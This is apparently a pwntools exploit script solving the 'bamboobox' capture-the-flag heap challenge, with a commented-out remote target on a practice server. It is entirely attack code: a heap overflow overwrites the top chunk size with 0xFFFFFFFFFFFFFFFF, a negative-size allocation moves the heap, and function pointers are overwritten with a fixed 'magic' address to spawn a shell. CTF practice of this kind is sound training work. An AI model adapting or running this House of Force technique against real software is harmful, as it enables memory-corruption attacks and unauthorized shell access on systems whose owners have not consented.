from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node4.buuoj.cn",27856)
io=process("./bamboobox")
elf=ELF("./bamboobox")
libc=ELF("libc-2.23.so")

def show():
    io.sendlineafter(b"choice:",b"1")

def add(n,cc):
    io.sendlineafter(b"choice:",b"2")
    io.sendlineafter(b"name:",str(n))
    io.sendafter(b"item:",cc)
    
def edit(n,s,cc):
    io.sendlineafter(b"choice:",b"3")
    io.sendlineafter(b"item:",str(n))
    io.sendlineafter(b"name:",str(s))
    io.sendafter(b"item:",cc)
    
def delete(n):
    io.sendlineafter(b"choice:",str(n))

def getshell():
    io.sendlineafter(b"choice:",b"5")

gdb.attach(io)
pause()

add(0x18,b"aaa") #0
add(0x40,b"bbb") #1
edit(1,0x58,cyclic(0x40)+p64(0)+p64(0xFFFFFFFFFFFFFFFF))

offset=-0x98
magic=0x400d49

add(offset,b"") #2

add(0x18,p64(magic)*2)
getshell()

io.interactive()